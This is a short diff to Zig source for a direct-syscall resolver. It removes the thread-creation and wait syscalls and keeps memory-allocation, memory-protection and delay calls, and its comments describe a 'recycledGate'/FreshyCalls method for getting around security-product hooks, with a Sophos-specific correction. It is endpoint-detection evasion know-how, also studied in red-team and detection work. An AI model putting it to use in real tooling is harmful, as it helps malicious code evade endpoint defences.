@@ -14,8 +14,6 @@ pub const Entry = struct {
 pub const Syscalls = struct {
     NtAllocateVirtualMemory: Entry,
     NtProtectVirtualMemory: Entry,
-    NtCreateThreadEx: Entry,
-    NtWaitForSingleObject: Entry,
     NtDelayExecution: Entry,
 
     pub fn resolve() ?Syscalls {
@@ -26,22 +24,18 @@ pub const Syscalls = struct {
         extract_pdata(ntdll);
 
         const names = [_][]const u8{
-            "NtWaitForSingleObject",
             "NtDelayExecution",
             "NtAllocateVirtualMemory",
             "NtProtectVirtualMemory",
-            "NtCreateThreadEx",
         };
         var result = Syscalls{
             .NtAllocateVirtualMemory = undefined,
             .NtProtectVirtualMemory = undefined,
-            .NtCreateThreadEx = undefined,
-            .NtWaitForSingleObject = undefined,
             .NtDelayExecution = undefined,
         };
         // recycledGate: FreshyCalls (hook-immune) + byte-scan validation + delta correction.
         // if any function isn't hooked, byte-scan it, compute the delta vs FreshyCalls,
-        // and apply to all five. on Sophos the delta corrects RVA sort ≠ KiServiceTable order.
+        // and apply to all. delta measured uniform +4 on Win11 24H2/25H2.
         var delta: i16 = 0;
         var delta_done = false;
         inline for (names) |name| {
